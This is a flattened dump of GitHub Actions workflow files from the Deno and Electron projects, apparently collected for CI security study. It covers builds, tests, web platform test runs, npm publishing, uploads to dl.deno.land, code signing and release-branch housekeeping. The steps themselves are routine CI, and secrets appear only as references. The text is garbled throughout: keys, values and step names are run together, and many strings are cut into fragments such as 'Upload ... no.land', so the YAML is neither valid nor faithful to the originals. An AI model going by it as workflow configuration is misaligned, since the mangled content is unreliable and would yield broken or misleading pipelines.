Compress-Archive -CompressionLevel Optimal -Force -Path target/release/denort.exe -DestinationPath target/release/denort-${{ matrix.arch }}-pc-windows-msvc.zip
Get-FileHash target/release/denort-${{ matrix.arch }}-pc-windows-msvc.zip -Algorithm SHA256 | Format-List > target/release/denort-${{ matrix.arch }}-pc-windows-msvc.zip.sha256sum
target/release/deno.exe -A tools/release/create_symcache.ts target/release/deno-${{ matrix.arch }}-pc-windows-msvc.symcachename: P ... indows)Upload canary to dl.deno.landUpload  ... no.landgsutil -h "Cache-Control: public, max-age=3600" cp ./target/release/*.zip gs://dl.deno.land/canary/$(git rev-parse HEAD)/
gsutil -h "Cache-Control: public, max-age=3600" cp ./target/release/*.sha256sum gs://dl.deno.land/canary/$(git rev-parse HEAD)/
gsutil -h "Cache-Control: public, max-age=3600" cp ./target/release/*.symcache gs://dl.deno.land/canary/$(git rev-parse HEAD)/
echo ${{ github.sha }} > canary-latest.txt
gsutil -h "Cache-Control: no-cache" cp canary-latest.txt gs://dl.deno.land/canary-$(rustc -vV | sed -n "s|host: ||p")-latest.txtname: U ... no.landAutobahn testsuite!(matrix.skip) && ((matrix.os == 'linux' && matrix.arch != 'aarch64') &&
matrix.job == 'test' &&
matrix.profile == 'release' &&
!startsWith(github.ref, 'refs/tags/'))target/release/deno run -A --config tests/config/deno.json ext/websocket/autobahn/fuzzingclient.jstarget/ ... ient.jsname: A ... stsuiteTest (full, debug)'Test (full, debug)'!(matrix.skip) && (matrix.job == 'test' &&
matrix.profile == 'debug' &&
!startsWith(github.ref, 'refs/tags/') &&
matrix.os == 'linux')cargo test --locked --features=panic-tracecargo t ... c-tracename: ' ... debug)'Test (fast, debug)'Test (fast, debug)'!(matrix.skip) && (matrix.job == 'test' &&
matrix.profile == 'debug' &&
(startsWith(github.ref, 'refs/tags/') || matrix.os != 'linux'))cargo test --locked --lib --features=panic-trace
cargo test --locked --tests --features=panic-traceTest (release)!(matrix.skip) && (matrix.job == 'test' &&
matrix.profile == 'release' &&
(matrix.use_sysroot || (
github.repository == 'denoland/deno' &&
!startsWith(github.ref, 'refs/tags/'))))cargo test --release --locked --features=panic-tracename: Test (release)Configure hosts file for WPTConfigu ... for WPT./wpt make-hosts-file | sudo tee -a /etc/hosts./wpt m ... c/hoststests/wpt/suite/name: C ... for WPTRun web platform tests (debug)Run web ... (debug)!(matrix.skip) && (matrix.wpt && matrix.profile == 'debug')DENO_BIN./target/debug/denoDENO_BI ... ug/denodeno run -A --lock=tools/deno.lock.json --config tests/config/deno.json\
        ./tests/wpt/wpt.ts setup
deno run -A --lock=tools/deno.lock.json --config tests/config/deno.json\
         ./tests/wpt/wpt.ts run --quiet --binary="$DENO_BIN"name: R ... (debug)Run web platform tests (release)Run web ... elease)!(matrix.skip) && (matrix.wpt && matrix.profile == 'release')'!(matr ... ase'')'./target/release/deno./targe ... se/denoDENO_BI ... se/denodeno run -A --lock=tools/deno.lock.json --config tests/config/deno.json\
         ./tests/wpt/wpt.ts setup
deno run -A --lock=tools/deno.lock.json --config tests/config/deno.json\
         ./tests/wpt/wpt.ts run --quiet --release         \
                            --binary="$DENO_BIN"          \
                            --json=wpt.json               \
                            --wptreport=wptreport.jsonname: R ... elease)Upload wpt results to dl.deno.land!(matrix.skip) && (matrix.wpt &&
matrix.os == 'linux' &&
matrix.profile == 'release' &&
github.repository == 'denoland/deno' &&
github.ref == 'refs/heads/main' && !startsWith(github.ref, 'refs/tags/'))gzip ./wptreport.json
gsutil -h "Cache-Control: public, max-age=3600" cp ./wpt.json gs://dl.deno.land/wpt/$(git rev-parse HEAD).json
gsutil -h "Cache-Control: public, max-age=3600" cp ./wptreport.json.gz gs://dl.deno.land/wpt/$(git rev-parse HEAD)-wptreport.json.gz
echo $(git rev-parse HEAD) > wpt-latest.txt
gsutil -h "Cache-Control: no-cache" cp wpt-latest.txt gs://dl.deno.land/wpt-latest.txtUpload wpt results to wpt.fyiUpload  ... wpt.fyiWPT_FYI_USERdenoWPT_FYI_PW${{ secrets.WPT_FYI_PW }}'${{ se ... _PW }}''${{ se ... PAT }}'WPT_FYI_USER: deno./target/release/deno run --allow-all --lock=tools/deno.lock.json \
    ./tools/upload_wptfyi.js $(git rev-parse HEAD) --ghstatusname: U ... wpt.fyiRun benchmarks!(matrix.skip) && (matrix.job == 'bench' && !startsWith(github.ref, 'refs/tags/'))cargo bench --lockedname: Run benchmarksPost Benchmarks!(matrix.skip) && (matrix.job == 'bench' &&
github.repository == 'denoland/deno' &&
github.ref == 'refs/heads/main' && !startsWith(github.ref, 'refs/tags/'))DENOBOT_PATDENOBOT ... PAT }}'git clone --depth 1 --branch gh-pages                             \
    https://${DENOBOT_PAT}@github.com/denoland/benchmark_data.git \
    gh-pages
./target/release/deno run --allow-all ./tools/build_benchmark_jsons.js --release
cd gh-pages
git config user.email "propelml@gmail.com"
git config user.name "denobot"
git add .
git commit --message "Update benchmarks"
git push origin gh-pagesname: P ... chmarksBuild product size infoBuild p ... ze info!(matrix.skip) && (matrix.job != 'lint' && matrix.profile != 'debug' && github.repository == 'denoland/deno' && (github.ref == 'refs/heads/main' || startsWith(github.ref, 'refs/tags/')))'!(matr ... /'')))'du -hd1 "./target/${{ matrix.profile }}"
du -ha  "./target/${{ matrix.profile }}/deno"
du -ha  "./target/${{ matrix.profile }}/denort"name: B ... ze infoWorker infocat /proc/cpuinfo
cat /proc/meminfoname: Worker infoUpload release to dl.deno.land (unix)Upload  ...  (unix)!(matrix.skip) && (matrix.os != 'windows' &&
matrix.job == 'test' &&
matrix.profile == 'release' &&
github.repository == 'denoland/deno' &&
startsWith(github.ref, 'refs/tags/'))gsutil -h "Cache-Control: public, max-age=3600" cp ./target/release/*.zip gs://dl.deno.land/release/${GITHUB_REF#refs/*/}/
gsutil -h "Cache-Control: public, max-age=3600" cp ./target/release/*.sha256sum gs://dl.deno.land/release/${GITHUB_REF#refs/*/}/
gsutil -h "Cache-Control: public, max-age=3600" cp ./target/release/*.symcache gs://dl.deno.land/release/${GITHUB_REF#refs/*/}/name: U ...  (unix)Upload release to dl.deno.land (windows)Upload  ... indows)!(matrix.skip) && (matrix.os == 'windows' &&
matrix.job == 'test' &&
matrix.profile == 'release' &&
github.repository == 'denoland/deno' &&
startsWith(github.ref, 'refs/tags/'))name: U ... indows)Create release notes!(matrix.skip) && (matrix.job == 'test' &&
matrix.profile == 'release' &&
github.repository == 'denoland/deno' &&
startsWith(github.ref, 'refs/tags/'))export PATH=$PATH:$(pwd)/target/release
./tools/release/05_create_release_notes.tsname: C ... e notesUpload release to GitHubUpload  ...  GitHubsoftprops/action-gh-release@v0.1.15softpro ... v0.1.15target/release/deno-x86_64-pc-windows-msvc.zip
target/release/deno-x86_64-pc-windows-msvc.zip.sha256sum
target/release/denort-x86_64-pc-windows-msvc.zip
target/release/denort-x86_64-pc-windows-msvc.zip.sha256sum
target/release/deno-x86_64-unknown-linux-gnu.zip
target/release/deno-x86_64-unknown-linux-gnu.zip.sha256sum
target/release/denort-x86_64-unknown-linux-gnu.zip
target/release/denort-x86_64-unknown-linux-gnu.zip.sha256sum
target/release/deno-x86_64-apple-darwin.zip
target/release/deno-x86_64-apple-darwin.zip.sha256sum
target/release/denort-x86_64-apple-darwin.zip
target/release/denort-x86_64-apple-darwin.zip.sha256sum
target/release/deno-aarch64-unknown-linux-gnu.zip
target/release/deno-aarch64-unknown-linux-gnu.zip.sha256sum
target/release/denort-aarch64-unknown-linux-gnu.zip
target/release/denort-aarch64-unknown-linux-gnu.zip.sha256sum
target/release/deno-aarch64-apple-darwin.zip
target/release/deno-aarch64-apple-darwin.zip.sha256sum
target/release/denort-aarch64-apple-darwin.zip
target/release/denort-aarch64-apple-darwin.zip.sha256sum
target/release/deno_src.tar.gz
target/release/lib.deno.d.tsbody_pathtarget/release/release-notes.mdtarget/ ... otes.mddraftfiles: |-name: U ...  GitHubSave cache build output (main)Save ca ...  (main)actions/cache/save@v4actions ... save@v4!(matrix.skip) && ((matrix.job == 'test' || matrix.job == 'lint') && github.ref == 'refs/heads/main')'!(matr ... ain'')'56-cargo-target-${{ matrix.os }}-${{ matrix.arch }}-${{ matrix.profile }}-${{ matrix.job }}-${{ github.sha }}'56-car ... sha }}'name: S ...  (main)name: ' ... rch }}'wasmbuild wasm32Install wasm targetrustup target add wasm32-unknown-unknownrustup  ... unknownname: I ...  targetCargo check (deno_resolver)Cargo c ... solver)cargo check --target wasm32-unknown-unknown -p deno_resolver && cargo check --target wasm32-unknown-unknown -p deno_resolver --features graphcargo c ... s graphname: C ... solver)Cargo check (deno_npm_cache)Cargo c ... _cache)cargo check --target wasm32-unknown-unknown -p deno_npm_cachecargo c ... m_cachename: C ... _cache)name: build wasm32publish-canarypublish canary- buildgithub.repository == 'denoland/deno' && github.ref == 'refs/heads/main'github. ... s/main'name: A ... e CloudSetup gcloudname: Setup gcloudUpload canary version file to dl.deno.landecho ${{ github.sha }} > canary-latest.txt
gsutil -h "Cache-Control: no-cache" cp canary-latest.txt gs://dl.deno.land/canary-latest.txt- name: ... e Cloudname: publish canarypre_build:name: ci/home/huawei/github-actions-security/.github/workflows/denoland_deno__node_compat_test.ymlnode_compat_test0 10 * * *'0 10 * * *'cron: '0 10 * * *'- cron: '0 10 * * *'darwinos: darwin- os: linuxsubmodules: trueSetup Denocanarydeno-version: canaryname: Setup DenoRun testsdeno -A tools/node_compat_tests.jsdeno -A ... ests.jsname: Run testsGzip the reportgzip tests/node_compat/report.jsongzip te ... rt.jsonname: G ...  reportUpload the report to dl.deno.landgsutil -h "Cache-Control: public, max-age=3600" cp tests/node_compat/report.json.gz gs://dl.deno.land/node-compat-test/$(date +%F)/report-${{matrix.os}}.json.gzruns-on ... ner }}'summary${{ always() }}Add the day summary to the month summaryAdd the ... summarydeno -A --config tests/config/deno.json tests/node_compat/add_day_summary_to_month_summary.tsdeno -A ... mary.tsname: A ... summaryGzip the month summaryGzip th ... summarygzip tests/node_compat/summary.json -kgzip te ... json -kname: G ... summaryUpload the month summaryUpload  ... summarygsutil -h "Cache-Control: public, max-age=3600" cp tests/node_compat/summary.json.gz gs://dl.deno.land/node-compat-test/summary-$(date +%Y-%m).json.gzname: U ... summaryPost message to slack channelPost me ... channeldeno -A --config tests/config/deno.json tests/node_compat/slack.tsdeno -A ... lack.tsSLACK_TOKEN${{ secrets.NODE_COMPAT_SLACK_TOKEN }}SLACK_CHANNEL${{ secrets.NODE_COMPAT_SLACK_CHANNEL }}${{ sec ... NNEL }}SLACK_T ... pat botname: P ... channelname: n ... at_test/home/huawei/github-actions-security/.github/workflows/denoland_deno__npm_publish.ymlnpm_publishVersion'Version'descrip ... ersion'id-token: writenpm publishsubmodu ... cursivename: Install Deno22.x'22.x'registry-urlhttps://registry.npmjs.org'https: ... js.org'node-version: '22.x'name: Install NodeNODE_AUTH_TOKEN${{ secrets.NPM_TOKEN }}NODE_AU ... OKEN }}./tools/release/npm/build.ts ${{ github.event.inputs.version }} --publish./tools ... publishname: npm publishname: npm_publish/home/huawei/github-actions-security/.github/workflows/denoland_deno__post_publish.ymlpost_publishupdate-dl-versionupdate dl.deno.land versionupdate  ... versiongithub.repository == 'denoland/deno'github. ... d/deno'uses: d ... deno@v2google-github-actions/auth@v1google- ... auth@v1google-github-actions/setup-gcloud@v1google- ... loud@v1Upload version file to dl.deno.landecho ${GITHUB_REF#refs/*/} > release-latest.txt
(deno run --allow-net tools/release/version_greater_latest.ts ${GITHUB_REF#refs/*/} || exit 0) && gsutil -h "Cache-Control: no-cache" cp release-latest.txt gs://dl.deno.land/release-latest.txt
name: u ... versionupdate-dl-version:name: post_publish/home/huawei/github-actions-security/.github/workflows/denoland_deno__promote_to_release.ymlpromote_to_releasereleaseKindKind of release'Kind of release'choicerclts- rcdescrip ... elease'commitHashCommit to promote to releaseCommit  ... releasedescrip ... releasereleaseKind:promote-to-release-windowspromote ... windowsPromote Windows to ReleasePromote ... Releasetoken:  ... _PAT }}Download Windows binariesDownloa ... inaries$CANARY_URL="https://dl.deno.land/canary/${{github.event.inputs.commitHash}}"
Invoke-WebRequest -Uri "$CANARY_URL/deno-x86_64-pc-windows-msvc.zip" -OutFile "deno-windows.zip"
Invoke-WebRequest -Uri "$CANARY_URL/denort-x86_64-pc-windows-msvc.zip" -OutFile "denort-windows.zip"
Expand-Archive -Path "deno-windows.zip" -DestinationPath "."
Expand-Archive -Path "denort-windows.zip" -DestinationPath "."
name: D ... inariesRun patchver for WindowsRun pat ... Windowsdeno install -A -n patchver https://deno.land/x/patchver@0.2.0/cli.ts
$CHANNEL="${{github.event.inputs.releaseKind}}"
# Patch deno.exe
Move-Item -Path "deno.exe" -Destination "deno_original.exe"
patchver "deno_original.exe" "deno.exe" $CHANNEL
# Patch denort.exe
Move-Item -Path "denort.exe" -Destination "denort_original.exe"
patchver "denort_original.exe" "denort.exe" $CHANNEL

# Rename files to match expected pattern
Move-Item -Path "deno.exe" -Destination "deno-x86_64-pc-windows-msvc-$CHANNEL.exe"
Move-Item -Path "denort.exe" -Destination "denort-x86_64-pc-windows-msvc-$CHANNEL.exe"
name: R ... WindowsAuthenticate with AzureAuthent ... h Azure${{ sec ... T_ID }}${{ sec ... N_ID }}client- ... T_ID }}name: A ... h AzureCode sign deno.exehttps:/ ... re.net/.deno-x86_64-pc-windows-msvc-${{github.event.inputs.releaseKind}}.exedeno-x8 ... d}}.exehttp:// ... oft.comendpoin ... re.net/name: C ... eno.exeVerify signature$SignTool = Get-ChildItem -Path "C:\Program Files*\Windows Kits\*\bin\*\x64\signtool.exe" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
$SignToolPath = $SignTool.FullName
& $SignToolPath verify /pa /v "deno-x86_64-pc-windows-msvc-${{github.event.inputs.releaseKind}}.exe"
name: V ... gnatureCreate archivesCompress-Archive -Path "deno-x86_64-pc-windows-msvc-${{github.event.inputs.releaseKind}}.exe" -DestinationPath "deno-x86_64-pc-windows-msvc.zip" -Force
Compress-Archive -Path "denort-x86_64-pc-windows-msvc-${{github.event.inputs.releaseKind}}.exe" -DestinationPath "denort-x86_64-pc-windows-msvc.zip" -Force
name: C ... rchivesUpload Windows archivesUpload  ... rchiveswindows-binariesdeno-x86_64-pc-windows-msvc.zip
denort-x86_64-pc-windows-msvc.zip
name: w ... inariesname: U ... rchivesname: P ... Releasepromote-to-releasePromote to ReleasePromote to Release (non-Windows)Promote ... indows)deno run -A ./tools/release/promote_to_release.ts ${{github.event.inputs.releaseKind}} ${{github.event.inputs.commitHash}}
actions/download-artifact@v4Create version file# Unzip a binary to get the version
unzip -o deno-x86_64-apple-darwin.zip
DENO_VERSION=$(./deno -V | cut -d ' ' -f 2 | cut -d '+' -f 1)
echo "v${DENO_VERSION}" > release-${{github.event.inputs.releaseKind}}-latest.txt
rm -f ./deno
name: C ... on fileUpload archives to dl.deno.landgsutil -h "Cache-Control: public, max-age=3600" cp ./*.zip gs://dl.deno.land/release/$(cat release-${{github.event.inputs.releaseKind}}-latest.txt)/
gsutil -h "Cache-Control: no-cache" cp release-${{github.event.inputs.releaseKind}}-latest.txt gs://dl.deno.land/release-${{github.event.inputs.releaseKind}}-latest.txt
promote ... indows:name: p ... release/home/huawei/github-actions-security/.github/workflows/denoland_deno__start_release.ymlstart_releasedefaultpatch'patch'minormajor- patchstart releaseCreate Gist URL${{ secrets.DENOBOT_GIST_PAT }}./tools/release/00_start_release.ts --${{github.event.inputs.releaseKind}}./tools ... eKind}}name: C ... ist URLname: start releasename: start_release/home/huawei/github-actions-security/.github/workflows/denoland_deno__version_bump.ymlversion_bumpKind of version bump'Kind o ... n bump'descrip ... n bump'version bumpRun version bumpgit remote add upstream https://github.com/denoland/deno
./tools/release/01_bump_crate_versions.ts --${{github.event.inputs.releaseKind}}
name: R ... on bumpCreate PRgit config user.email "${{ github.actor }}@users.noreply.github.com"
git config user.name "${{ github.actor }}"
./tools/release/02_create_pr.ts
name: Create PRname: version bumpname: version_bump/home/huawei/github-actions-security/.github/workflows/denoland_deno__wpt_epoch.ymlwpt_epoch30 0 * * *cron: 30 0 * * *- cron: 30 0 * * *wpt / ${{ matrix.os }} / ${{ matrix.deno-version }}wpt / $ ... sion }}v1.x[v1.x, canary][ubuntu-24.04-xl]deno-ve ... canary]${{ matrix.deno-version }}deno-ve ... sion }}python- ...  '3.11'python --version
deno --version
Switch WPT submodule to epochs/dailySwitch  ... s/dailygit remote set-branches origin '*'
git fetch origin
git checkout $(./wpt rev-list --epoch 1d)
git checkout -b epochs/daily
name: S ... s/dailyConfigure hosts file for WPT (unix)Configu ...  (unix)runner.os != 'Windows'runner. ... indows'name: C ...  (unix)Configure hosts file for WPT (windows)Configu ... indows)runner.os == 'Windows'python wpt make-hosts-file | Out-File $env:SystemRoot\System32\drivers\etc\hosts -Encoding ascii -Appendpython  ... -AppendRun web platform testsRun web ... m testsdeno run -A --lock=tools/deno.lock.json --config=tests/config/deno.json \
  ./tests/wpt/wpt.ts setup
deno run -A --lock=tools/deno.lock.json --config=tests/config/deno.json \
  ./tests/wpt/wpt.ts run                                             \                                                \
  --binary=$(which deno) --quiet --release --no-ignore --json=wpt.json --wptreport=wptreport.json --exit-zero
name: R ... m tests${{ sec ... I_PW }}deno run -A --lock=tools/deno.lock.json ./tools/upload_wptfyi.js wptreport.json --from-raw-file --daily-run
name: w ... sion }}wpt:name: wpt_epoch/home/huawei/github-actions-security/.github/workflows/electron_electron__archaeologist-dig.ymlArchaeologistarchaeologist-digArchaeologist DigCheckout Electronname: C ... lectronSetup Node.js/npmactions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020actions ... 682002020.19.xnode-ve ... 20.19.xname: S ... .js/npmSetting Up Dig Siteecho "remote: ${{ github.event.pull_request.head.repo.clone_url }}"
echo "sha ${{ github.event.pull_request.head.sha }}"
echo "base ref ${{ github.event.pull_request.base.ref }}"
git clone https://github.com/electron/electron.git electron          
cd electron
mkdir -p artifacts
git remote add fork ${{ github.event.pull_request.head.repo.clone_url }} && git fetch fork
git checkout  ${{ github.event.pull_request.head.sha }}
git merge-base origin/${{ github.event.pull_request.base.ref }} HEAD > .dig-old
echo  ${{ github.event.pull_request.head.sha }} > .dig-new
cp .dig-old artifacts
name: S ... ig SiteGenerating Types for SHA in .dig-newGenerat ... dig-new./.github/actions/generate-types./.gith ... e-typessha-file.dig-newfilenameelectron.new.d.tssha-file: .dig-newname: G ... dig-newGenerating Types for SHA in .dig-oldGenerat ... dig-old.dig-oldelectron.old.d.tssha-file: .dig-oldname: G ... dig-oldUpload artifactsartifactselectron/artifactsinclude-hidden-filesname: artifactsname: U ... tifactsSet job outputgit diff --no-index electron.old.d.ts electron.new.d.ts > patchfile || true
if [ -s patchfile ]; then
  echo "Changes Detected"
  echo "## Changes Detected" > $GITHUB_STEP_SUMMARY
  echo "Looks like the \`electron.d.ts\` file changed." >> $GITHUB_STEP_SUMMARY
  echo "" >> $GITHUB_STEP_SUMMARY
  echo "\`\`\`\`\`\`diff" >> $GITHUB_STEP_SUMMARY
  cat patchfile >> $GITHUB_STEP_SUMMARY
  echo "\`\`\`\`\`\`" >> $GITHUB_STEP_SUMMARY    
else
  echo "No Changes Detected"
  echo "## No Changes" > $GITHUB_STEP_SUMMARY
  echo "We couldn't see any changes in the \`electron.d.ts\` artifact" >> $GITHUB_STEP_SUMMARY
fi
./electron/artifactsname: Set job output- name: ... lectronname: A ... ist Digarchaeologist-dig:name: Archaeologist/home/huawei/github-actions-security/.github/workflows/electron_electron__branch-created.ymlBranch Createdbranch-nameBranch name (e.g. `29-x-y`)Branch  ... 9-x-y`)descrip ... 9-x-y`)branch-name:createrelease-branch-createdrelease ... createdRelease Branch CreatedRelease ... Created${{ github.event_name == 'workflow_dispatch' || (github.event.ref_type == 'branch' && endsWith(github.event.ref, '-x-y') && !startsWith(github.event.ref, 'roller')) }}${{ git ... r')) }}repository-projectsDetermine Major VersionDetermi ... Versioncheck-major-versionBRANCH_NAME${{ github.event.inputs.branch-name || github.event.ref }}${{ git ... .ref }}BRANCH_ ... .ref }}if [[ "$BRANCH_NAME" =~ ^([0-9]+)-x-y$ ]]; then
  echo "MAJOR=${BASH_REMATCH[1]}" >> "$GITHUB_OUTPUT"
else
  echo "Not a release branch: $BRANCH_NAME"
fi
name: D ... VersionNew Release Branch TasksNew Rel ... h Tasks${{ steps.check-major-version.outputs.MAJOR }}${{ ste ... AJOR }}GH_REPOelectron/electronMAJORNUM_SUPPORTED_VERSIONSNUM_SUP ... ERSIONS3PREVIOUS_MAJOR=$((MAJOR - 1))
UNSUPPORTED_MAJOR=$((MAJOR - NUM_SUPPORTED_VERSIONS - 1))

# Create new labels
gh label create $MAJOR-x-y --color 8d9ee8 || true
gh label create target/$MAJOR-x-y --color ad244f --description "PR should also be added to the \"${MAJOR}-x-y\" branch." || true
gh label create merged/$MAJOR-x-y --color 61a3c6 --description "PR was merged to the \"${MAJOR}-x-y\" branch." || true
gh label create in-flight/$MAJOR-x-y --color db69a6 || true
gh label create needs-manual-bp/$MAJOR-x-y --color 8b5dba || true

# Change color of old labels
gh label edit $UNSUPPORTED_MAJOR-x-y --color ededed || true
gh label edit target/$UNSUPPORTED_MAJOR-x-y --color ededed || true
gh label edit merged/$UNSUPPORTED_MAJOR-x-y --color ededed || true
gh label edit in-flight/$UNSUPPORTED_MAJOR-x-y --color ededed || true
gh label edit needs-manual-bp/$UNSUPPORTED_MAJOR-x-y --color ededed || true

# Add the new target label to any PRs which:
#   * target the previous major
#   * are in-flight for the previous major
#   * need manual backport for the previous major
for PREVIOUS_MAJOR_LABEL in target/$PREVIOUS_MAJOR-x-y in-flight/$PREVIOUS_MAJOR-x-y needs-manual-bp/$PREVIOUS_MAJOR-x-y; do
  PULL_REQUESTS=$(gh pr list --label $PREVIOUS_MAJOR_LABEL --jq .[].number --json number --limit 500)
  if [[ $PULL_REQUESTS ]]; then
    echo $PULL_REQUESTS | xargs -n 1 gh pr edit --add-label target/$MAJOR-x-y || true
  fi
done
name: N ... h TasksGenerate GitHub App tokenGenerat ... p tokenelectron/github-app-auth-action@384fd19694fe7b6dcc9a684746c6976ad78228aeelectro ... 78228aegenerate-tokencreds${{ secrets.RELEASE_BOARD_GH_APP_CREDS }}${{ sec ... REDS }}orgelectroncreds:  ... REDS }}name: G ... p tokenGenerate Release Project Board MetadataGenerat ... etadataactions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdeaactions ... 799cdeagenerate-project-metadatagenerat ... etadatascriptconst major = ${{ steps.check-major-version.outputs.MAJOR }}
const nextMajor = major + 1
const prevMajor = major - 1

core.setOutput("major", major)
core.setOutput("next-major", nextMajor)
core.setOutput("prev-major", prevMajor)
core.setOutput("prev-prev-major", prevMajor - 1)
core.setOutput("template-view", JSON.stringify({
    major,
    "next-major": nextMajor,
    "prev-major": prevMajor,
}))
script: |name: G ... etadataCreate Release Project BoardCreate  ... t Boarddsanders11/project-actions/copy-project@2134fe7cc71c58b7ae259c82a8e63c6058255678dsander ... 8255678create-release-boarddraftsproject-number64template-view${{ steps.generate-project-metadata.outputs.template-view }}${{ ste ... view }}title${{ steps.generate-project-metadata.outputs.major }}-x-y${{ ste ...  }}-x-y${{ steps.generate-token.outputs.token }}${{ ste ... oken }}drafts: truename: C ... t BoardDump Release Project Board ContentsDump Re ... ontentsgh project item-list ${{ steps.create-release-board.outputs.number }} --owner electron --format json | jqgh proj ... on | jqGITHUB_ ... oken }}name: D ... ontentsFind Previous Release Project BoardFind Pr ... t Boarddsanders11/project-actions/find-project@2134fe7cc71c58b7ae259c82a8e63c6058255678find-prev-release-boardfind-pr ... e-boardfail-if-project-not-foundfail-if ... t-found${{ steps.generate-project-metadata.outputs.prev-prev-major }}-x-yfail-if ... : falsename: F ... t BoardClose Previous Release Project BoardClose P ... t Board${{ steps.find-prev-release-board.outputs.number }}${{ ste ... mber }}dsanders11/project-actions/close-project@2134fe7cc71c58b7ae259c82a8e63c6058255678project ... mber }}- name: ... Versionname: R ... Createdrelease ... reated:name: Branch Created/home/huawei/github-actions-security/.github/workflows/electron_electron__build.ymlbuild-image-shaSHA for electron/build image'SHA fo ...  image'424eedbf277ad9749ffa9219068aa72ed4a5e373'424eed ... a5e373'type: stringskip-macosbooleanSkip macOS builds'Skip macOS builds'type: booleanskip-linuxSkip Linux builds'Skip Linux builds'skip-windowsSkip Windows builds'Skip W ... builds'skip-lintSkip lint check'Skip lint check'build-image-sha:[1-9][0-9]-x-y'[1-9][0-9]-x-y'setupdocs${{ steps.filter.outputs.docs }}${{ ste ... docs }}src${{ steps.filter.outputs.src }}${{ ste ... .src }}${{ steps.set-output.outputs.build-image-sha }}${{ ste ... -sha }}docs-only${{ steps.set-output.outputs.docs-only }}${{ ste ... only }}docs: $ ... docs }}${{ github.event.pull_request.head.sha }}${{ git ... .sha }}ref: ${ ... .sha }}uses: a ... #v4.0.2dorny/paths-filter@de90cc6fb38fc0963ad72b210f1f284cd68cea36dorny/p ... 68cea36filterfiltersdocs:
  - 'docs/**'
src:
  - '!docs/**'
filters: |uses: d ...  v3.0.2Set Outputs for Build Image SHA & Docs OnlySet Out ... cs Onlyset-outputif [ -z "${{ inputs.build-image-sha }}" ]; then
  echo "build-image-sha=424eedbf277ad9749ffa9219068aa72ed4a5e373" >> "$GITHUB_OUTPUT"
else
  echo "build-image-sha=${{ inputs.build-image-sha }}" >> "$GITHUB_OUTPUT"
fi
echo "docs-only=${{ steps.filter.outputs.docs == 'true' && steps.filter.outputs.src == 'false' }}" >> "$GITHUB_OUTPUT"
name: S ... cs Only- uses: ... #v4.0.2${{ !inputs.skip-lint }}${{ !in ... lint }}./.github/workflows/pipeline-electron-lint.yml./.gith ... int.yml{"image":"ghcr.io/electron/build:${{ needs.setup.outputs.build-image-sha }}","options":"--user root"}'{"imag ... root"}'contain ... root"}'needs: setup${{ needs.setup.outputs.docs-only == 'true' }}${{ nee ... rue' }}./.github/workflows/pipeline-electron-docs-only.yml./.gith ... nly.ymlcheckout-macos${{ needs.setup.outputs.src == 'true' && !inputs.skip-macos}}${{ nee ... macos}}electron-arc-linux-amd64-32coreelectro ... -32coreghcr.io/electron/build:${{ needs.setup.outputs.build-image-sha }}ghcr.io ... -sha }}--user rootvolumes/mnt/cross-instance-cache:/mnt/cross-instance-cache/mnt/cr ... e-cache/var/run/sas:/var/run/sas/var/ru ... run/sas- /mnt/ ... e-cacheimage:  ... -sha }}CHROMIUM_GIT_COOKIE${{ secrets.CHROMIUM_GIT_COOKIE }}${{ sec ... OKIE }}GCLIENT_EXTRA_ARGS--custom-var=checkout_mac=True --custom-var=host_os=mac'--cust ... os=mac'CHROMIU ... OKIE }}${{ needs.setup.outputs.build-image-sha }}${{ nee ... -sha }}build-i ... -sha }}src/electronpath: src/electronCheckout & Sync & SaveCheckou ...  & Save./src/electron/.github/actions/checkout./src/e ... heckoutgenerate-sas-token'true'target-platformgenerat ...  'true'name: C ...  & Savecheckout-linux${{ needs.setup.outputs.src == 'true' && !inputs.skip-linux}}${{ nee ... linux}}--custom-var=checkout_arm=True --custom-var=checkout_arm64=True'--cust ... 4=True'PATCH_UP_APP_CREDS${{ secrets.PATCH_UP_APP_CREDS }}${{ needs.setup.outputs.build-image-sha}}${{ nee ... e-sha}}build-i ... e-sha}}checkout-windows${{ needs.setup.outputs.src == 'true' && !inputs.skip-windows }}${{ nee ... dows }}--user root --device /dev/fuse --cap-add SYS_ADMIN--user  ... S_ADMIN/mnt/win-cache:/mnt/win-cache/mnt/wi ... n-cache- /mnt/ ... n-cacheCHROMIUM_GIT_COOKIE_WINDOWS_STRINGCHROMIU ... _STRING${{ secrets.CHROMIUM_GIT_COOKIE_WINDOWS_STRING }}${{ sec ... RING }}--custom-var=checkout_win=True'--cust ... n=True'TARGET_OSwin'win'ELECTRON_DEPOT_TOOLS_WIN_TOOLCHAINELECTRO ... OLCHAIN'1'macos-gn-check./.github/workflows/pipeline-segment-electron-gn-check.yml./.gith ... eck.ymltarget-archsx64 arm64check-runs-ongn-build-typetestingtarget- ... : macosuses: . ... eck.ymllinux-gn-checkx64 arm arm64electron-arc-linux-amd64-8coreelectro ... 4-8corecheck-container{"image":"ghcr.io/electron/build:${{ needs.checkout-linux.outputs.build-image-sha }}","options":"--user root","volumes":["/mnt/cross-instance-cache:/mnt/cross-instance-cache"]}'{"imag ... che"]}'target- ... : linuxwindows-gn-checkx64 x86 arm64{"image":"ghcr.io/electron/build:${{ needs.checkout-windows.outputs.build-image-sha }}","options":"--user root --device /dev/fuse --cap-add SYS_ADMIN","volumes":["/mnt/win-cache:/mnt/win-cache"]}target-platform: winmacos-x64./.github/workflows/pipeline-electron-build-and-test.yml./.gith ... est.ymlbuild-runs-onmacos-14-xlargetest-runs-ontarget-archx64is-releasegenerate-symbolsupload-to-storage'0'build-r ... -xlargemacos-arm64arm64linux-x64./.github/workflows/pipeline-electron-build-and-test-and-nan.yml./.gith ... nan.ymlelectron-arc-linux-amd64-4coreelectro ... 4-4corebuild-containertest-container{"image":"ghcr.io/electron/build:${{ needs.checkout-linux.outputs.build-image-sha }}","options":"--user root --privileged --init"}'{"imag ... init"}'build-r ... -32corelinux-x64-asanis-asanlinux-armelectron-arc-linux-arm64-4core{"image":"ghcr.io/electron/test:arm32v7-${{ needs.checkout-linux.outputs.build-image-sha }}","options":"--user root --privileged --init","volumes":["/home/runner/externals:/mnt/runner-externals"]}'{"imag ... als"]}'armlinux-arm64{"image":"ghcr.io/electron/test:arm64v8-${{ needs.checkout-linux.outputs.build-image-sha }}","options":"--user root --privileged --init"}windows-x64electron-arc-windows-amd64-16coreelectro ... -16corebuild-r ... -16corewindows-x86windows-arm64electron-hosted-windows-arm64-4coregha-doneGitHub Actions CompletedGitHub  ... mpleted[docs-o ... 